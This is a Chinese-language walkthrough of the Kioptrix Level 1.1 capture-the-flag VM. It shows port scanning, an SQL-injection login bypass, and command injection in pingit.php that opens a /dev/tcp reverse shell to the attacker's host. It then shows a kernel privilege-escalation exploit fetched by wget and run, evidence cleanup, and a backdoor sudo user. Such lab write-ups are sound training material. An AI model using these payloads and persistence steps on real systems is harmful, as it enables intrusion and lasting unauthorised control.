# KIOPTRIX: LEVEL 1.1 (#2)

### 主机发现

首先需要发现目标IP地址，我这台靶机是VMware的打开的用了桥接模式，我这里使用arp-scan发现主机

```
┌──(root㉿kali)-[~]
└─# arp-scan -l                  
Interface: eth0, type: EN10MB, MAC: 00:0c:29:f5:d6:36, IPv4: 192.168.43.24
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.43.1    9e:7b:7e:db:9c:66       (Unknown: locally administered)
192.168.43.90   00:0c:29:13:1c:2b       VMware, Inc.
192.168.43.81   c6:53:ec:f2:4f:db       (Unknown: locally administered)
192.168.43.153  00:0c:29:1f:80:6f       VMware, Inc.
192.168.43.175  70:32:17:c7:c0:63       Intel Corporate
```

除去已知的IP设备，"192.168.43.90"这个地址是目标IP

### 扫描枚举

RustScan是一款开源的端口扫描工具，它使用Rust编程语言编写，旨在提供快速、准确和易于使用的端口扫描功能。

{% embed url="https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb" %}

```
┌──(root㉿kali)-[~]
└─# rustscan -a 192.168.43.90 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.43.90:22
Open 192.168.43.90:80
Open 192.168.43.90:111
Open 192.168.43.90:443
Open 192.168.43.90:3306
Open 192.168.43.90:631
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-14 02:27 EDT
NSE: Loaded 46 scripts for scanning.
Initiating ARP Ping Scan at 02:27
Scanning 192.168.43.90 [1 port]
Completed ARP Ping Scan at 02:27, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:27
Completed Parallel DNS resolution of 1 host. at 02:27, 0.09s elapsed
DNS resolution of 1 IPs took 0.09s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 02:27
Scanning 192.168.43.90 [6 ports]
Discovered open port 443/tcp on 192.168.43.90
Discovered open port 111/tcp on 192.168.43.90
Discovered open port 22/tcp on 192.168.43.90
Discovered open port 80/tcp on 192.168.43.90
Discovered open port 3306/tcp on 192.168.43.90
Discovered open port 631/tcp on 192.168.43.90
Completed SYN Stealth Scan at 02:27, 0.03s elapsed (6 total ports)
Initiating Service scan at 02:27
Scanning 6 services on 192.168.43.90
Completed Service scan at 02:27, 12.37s elapsed (6 services on 1 host)
NSE: Script scanning 192.168.43.90.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 02:27
Completed NSE at 02:27, 0.23s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 02:27
Completed NSE at 02:27, 0.13s elapsed
Nmap scan report for 192.168.43.90
Host is up, received arp-response (0.0042s latency).
Scanned at 2023-06-14 02:27:22 EDT for 13s

PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 64 OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     syn-ack ttl 64 Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  syn-ack ttl 64 2 (RPC #100000)
443/tcp  open  ssl/http syn-ack ttl 64 Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      syn-ack ttl 64 CUPS 1.1
3306/tcp open  mysql    syn-ack ttl 64 MySQL (unauthorized)
MAC Address: 00:0C:29:13:1C:2B (VMware)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds
           Raw packets sent: 7 (292B) | Rcvd: 7 (292B)
```

这里可以看到80端口运行着一个Apache服务，先去访问一下它发现是一个登入界面

<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

通过端口扫描结果中可以看到有一个mysql的服务，所里这里尝试使用SQL注入,使用payload ' or '1'='1 密码框也是输入这个payload

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

点击登录，成功跳转到一个web控制台，可以ping它们的主机

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

这里我ping一下我的kali主机 IP地址是192.168.43.24

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

输出结果

```
192.168.43.24

PING 192.168.43.24 (192.168.43.24) 56(84) bytes of data.
64 bytes from 192.168.43.24: icmp_seq=0 ttl=64 time=1.20 ms
64 bytes from 192.168.43.24: icmp_seq=1 ttl=64 time=2.75 ms
64 bytes from 192.168.43.24: icmp_seq=2 ttl=64 time=1.02 ms

--- 192.168.43.24 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 1.029/1.662/2.754/0.776 ms, pipe 2

```

看起来应用程序只是在后端调用系统 ping 命令。 我们可以尝试一些命令注入。 让我们给应用程序一个分号，后跟一个常见的 Linux 命令，而不是 IP，看看它给我们的输出是什么。 我将使用 ;ls 作为输入。

<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

ls命令成功执行，使用cat命令查看一下pingit.php这个文件

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

> \
> 这段代码是一段简单的 PHP 代码，用于执行命令行中的 `ping` 命令，并将结果输出到页面上。
>
> 具体解释如下：
>
> * `shell_exec()` 是 PHP 中的一个函数，用于在操作系统的命令行中执行指定的命令，并返回执行结果。
> * `ping -c 3` 是一个命令行命令，用于向指定的目标地址发送 ICMP 回显请求（ping 请求），并接收 ICMP 回显响应（ping 响应）。
> * `$target` 是一个变量，表示目标地址，将会在执行代码时替换为具体的目标地址。
> * `echo shell_exec('ping -c 3 ' . $target);` 执行 `ping -c 3` 命令，并将结果通过 `echo` 命令输出到页面上。
>
> 这段代码的作用是在网页上显示执行 `ping` 命令后的结果，其中 `ping` 的目标地址由 `$target` 变量指定

### 初步利用

现在我们已经在 pingit.php Web 应用程序中发现了命令注入，获取 shell 应该是微不足道的。为了简单起见，我们可以使用 curl。

Firefox 中的开发人员工具包含一项功能，允许您复制代表浏览器中发出的任何请求的 curl 命令。要使用此功能，请从 pingit.php 页面执行以下操作：

1. 按 F12 启动开发人员工具。
2. 打开开发者工具的 Network 选项卡可以查看所有的 HTTP 请求。
3. 重新加载页面。出现提示时，选择重新发送数据。
4. 找到对文件 pingit.php 的 POST 请求。
5. 右键单击 POST 请求，突出显示复制，然后选择复制为 cURL。这将复制一个可以直接粘贴到 shell 提示符的curl 命令。

选择copy as curl

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

将这这段命令粘贴到终端，太长了，可以看到 --data-raw 的IP字段的参数可以用来命令执行，我们可以生成一个反向shell，下面是一个生成反向shell的一个网站

{% embed url="https://www.revshells.com/" %}

```
bash -i >& /dev/tcp/192.168.43.23/8888 0>&1
```

注意一下这个反向shell的payload的&符号在POST传参中需要url编码一下 &对应的url编码是%26

<pre><code><strong>bash -i >%26 /dev/tcp/192.168.43.23/8888 0>%261
</strong></code></pre>

```sh
┌──(root㉿kali)-[~]
└─# curl 'http://192.168.43.90/pingit.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://192.168.43.90/index.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.43.90' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'ip=%3Bbash -i >%26 /dev/tcp/192.168.43.23/8888 0>%261&submit=submit'll
```

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

监听端口返回了一个名为apache的普通用户

### 进一步利用和权限提升

我们现在有了一个apache用户普通用户，下一步该如何获得root用户权限？

现在是一个半交互式shell，让我们获得一个完全交互式shell

```
bash-3.00$ bash -i
bash: no job control in this shell
bash-3.00$ export PS1="\u@\H:\w$ "
apache@kioptrix.level2:/var/www/html$
```

兔子洞-mysql

查看index.php发现这个文件是MySQL的一个配置文件存在john用户，密码为hiroshima，还有一个可以访问的webapp数据库

```
apache@kioptrix.level2:/var/www/html$ cat index.php
<?php
        mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
        //print "Connected to MySQL<br />";
        mysql_select_db("webapp");

        if ($_POST['uname'] != ""){
                $username = $_POST['uname'];
                $password = $_POST['psw'];
                $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
                //print $query."<br>";
                $result = mysql_query($query);

                $row = mysql_fetch_array($result);
                //print "ID: ".$row['id']."<br />";
        }

?>
```

通过查看/etc/passwd 文件发现john是一个系统用户，尝试一下ssh登录

```
┌──(root㉿kali)-[~]
└─# ssh john@192.168.43.90
Unable to negotiate with 192.168.43.90 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

我这边连接爆了这样一个错误，尝试一下连接mysql发现连接失败，可以看到提示不允许远程连接

```
┌──(root㉿kali)-[~]
└─# mysql -h 192.168.43.90 -uroot -p 
Enter password: 
ERROR 1130 (HY000): Host '192.168.43.24' is not allowed to connect to this MySQL server
```

看来我们无法远程访问 MySQL 服务器。但是，我们可以通过直接从命令行将它们传递给 mysql 命令来运行单个 SQL 查询。让我们挖掘更多的信息：

```
apache@kioptrix.level2:/var/www/html$ mysql -u john -p webapp -e 'show tables'
Enter password: hiroshima
Tables_in_webapp
users
apache@kioptrix.level2:/var/www/html$ mysql -u john -p webapp -e 'describe users'
Enter password: hiroshima
Field   Type    Null    Key     Default Extra
id      int(11) YES             NULL
username        varchar(100)    YES             NULL
password        varchar(10)     YES             NULL
apache@kioptrix.level2:/var/www/html$ mysql -u john -p webapp -e 'select * from users'
Enter password: hiroshima
id      username        password
1       admin   5afac8d85f
2       john    66lajGGbla
```

通过查看/etc/passwd文件已经知道john这个用户不能通过ssh连接，已经知道数据库是mysql，我们尝试枚举 mysql.user 表以获取更多用户名和密码

```
apache@kioptrix.level2:/var/www/html$ mysql -u john -p mysql -e 'select user,password from user'
Enter password: hiroshima
user    password
root    5a6914ba69e02807
root    5a6914ba69e02807


john    5a6914ba69e02807
```

找到了一个root用户，但是密码被加密了，用john解一下

```
┌──(root㉿kali)-[~/Desktop/test]
└─# echo john:5a6914ba69e02807 > hashes

john hashes --wordlist=/usr/share/wordlists/rockyou.txt.gz --fork=4
Created directory: /root/.john
Warning: detected hash type "asa-md5", but the string is also recognized as "mysql"
Use the "--format=mysql" option to force loading these as that type instead
Warning: detected hash type "asa-md5", but the string is also recognized as "oracle"
Use the "--format=oracle" option to force loading these as that type instead
Warning: detected hash type "asa-md5", but the string is also recognized as "pix-md5"
Use the "--format=pix-md5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (asa-md5, Cisco ASA [md5($p.$s) (Cisco ASA) 256/256 AVX2 8x3])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: UTF-16 BOM seen in wordlist. File may not be read properly unless you re-encode it
Warning: UTF-16 BOM seen in wordlist. File may not be read properly unless you re-encode it
Warning: UTF-16 BOM seen in wordlist. File may not be read properly unless you re-encode it
Warning: UTF-16 BOM seen in wordlist. File may not be read properly unless you re-encode it
2 0g 0:00:00:01 DONE (2023-06-15 04:21) 0g/s 4254p/s 4254c/s 4254C/s �..�[�?�V
3 0g 0:00:00:01 DONE (2023-06-15 04:21) 0g/s 4536p/s 4536c/s 4536C/s �U���:���..9�
4 0g 0:00:00:01 DONE (2023-06-15 04:21) 0g/s 4286p/s 4286c/s 4286C/s �w6��b���..�����V
1 0g 0:00:00:01 DONE (2023-06-15 04:21) 0g/s 4207p/s 4207c/s 4207C/s [w�#
Waiting for 3 children to terminate
Session completed. 
```

这里没有解码出来

### 进一步枚举

使用nmap扫描一下目标

```
┌──(root㉿kali)-[~/Desktop/test]
└─# nmap -sC -sV -A 192.168.43.90    
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-15 04:26 EDT
Nmap scan report for 192.168.43.90
Host is up (0.0016s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            765/udp   status
|_  100024  1            768/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_http-server-header: Apache/2.0.52 (CentOS)
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
|_ssl-date: 2023-06-14T06:18:44+00:00; -1d02h08m21s from scanner time.
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
|_http-server-header: CUPS/1.1
| http-methods: 
|_  Potentially risky methods: PUT
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:13:1C:2B (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
```

没发现什么有用的东西，看一下系统内核

```
apache@kioptrix.level2:/var/www/html$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
apache@kioptrix.level2:/var/www/html$ lsb_release -a
LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch                            
Distributor ID: CentOS                                                                                          
Description:    CentOS release 4.5 (Final)                                                                      
Release:        4.5                                                                                             
Codename:       Final
```

使用searchsploit 搜索一下

```
┌──(root㉿kali)-[~/Desktop/test]
└─# searchsploit CentOS 4.5    
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Escalation (5)                                                                    | linux/local/9479.c
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)                                                                     | linux_x86/local/9542.c
Linux Kernel 3.14.5 (CentOS 7 / RHEL) - 'libfutex' Local Privilege Escalation                                                                                                                            | linux/local/35370.c
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

第二个看起来可以使用，将它保存到当前路径

```
┌──(root㉿kali)-[~/Desktop/test]
└─# searchsploit -m linux_x86/local/9542.c
  Exploit: Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)
      URL: https://www.exploit-db.com/exploits/9542
     Path: /usr/share/exploitdb/exploits/linux_x86/local/9542.c
    Codes: CVE-2009-2698
 Verified: True
File Type: C source, ASCII text
Copied to: /root/Desktop/test/9542.c
```

这是一个本地漏洞，所以我们需要在远程目标上运行它。我将使用 python启动一个快速 HTTP 服务器来传输这个利用脚本。

```
┌──(root㉿kali)-[~/Desktop/test]
└─# python3 -m http.server 3333
Serving HTTP on 0.0.0.0 port 3333 (http://0.0.0.0:3333/) ...
```

```
apache@kioptrix.level2:/var/www/html$ cd /tmp                                                                   
apache@kioptrix.level2:/tmp$ wget http://192.168.43.24/9542.c                                                   
--02:46:49--  http://192.168.43.24/9542.c                                                                       
           => `9542.c'                                                                                          
Connecting to 192.168.43.24:80... failed: Connection refused.                                                   
apache@kioptrix.level2:/tmp$ ls 
apache@kioptrix.level2:/tmp$ cd /tmp      
apache@kioptrix.level2:/tmp$ wget http://192.168.43.24:3333/9542.c  
--02:49:23--  http://192.168.43.24:3333/9542.c
           => `9542.c'
Connecting to 192.168.43.24:3333... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,535 (2.5K) [text/x-csrc]

    0K ..                                                    100%   39.63 MB/s

02:49:23 (39.63 MB/s) - `9542.c' saved [2535/2535]


apache@kioptrix.level2:/tmp$ gcc -o exploit 9542.c
9542.c:109:28: warning: no newline at end of file
apache@kioptrix.level2:/tmp$ ./exploit
sh: no job control in this shell
root@kioptrix.level2:/tmp$ id
uid=0(root) gid=0(root) groups=48(apache)
```

现在已经将权限提升至root用户

### 权限维持

现在我们有了 root，我们将清理并创建一个用于持久访问的用户。&#x20;

首先，删除提权脚本：

```
root@kioptrix.level2:/tmp$ rm exploit 9542.c  
root@kioptrix.level2:/tmp$ ls -al
total 20
drwxr-xrwx   4 root root 4096 Jun 14 02:57 .
drwxr-xr-x  23 root root 4096 Jun 13 17:52 ..
drwxrwxrwt   2 root root 4096 Jun 13 17:53 .font-unix
drwxrwxrwt   2 root root 4096 Jun 13 17:52 .ICE-unix

```

现在让我们创建自己的用户并授予他 sudo 权限：

```
root@kioptrix.level2:/tmp$ useradd tmd
root@kioptrix.level2:/tmp$ passwd tmd
New UNIX password: 123456.
BAD PASSWORD: it is too simplistic/systematic
Retype new UNIX password: 123456.
Changing password for user tmd.
passwd: all authentication tokens updated successfully.
root@kioptrix.level2:/tmp$ echo tmd ALL=(ALL) ALL >> /etc/sudoers
root@kioptrix.level2:/tmp$ tail -n4 /etc/sudoers
# %users  ALL=/sbin/mount /cdrom,/sbin/umount /cdrom
# %users  localhost=/sbin/shutdown -h now

tmd ALL=(ALL) ALL
```

应为环境问题我这边ssh不能连接，看大佬文章是可以的，下面贴上大佬的博客

{% embed url="https://www.c0dedead.io/" %}

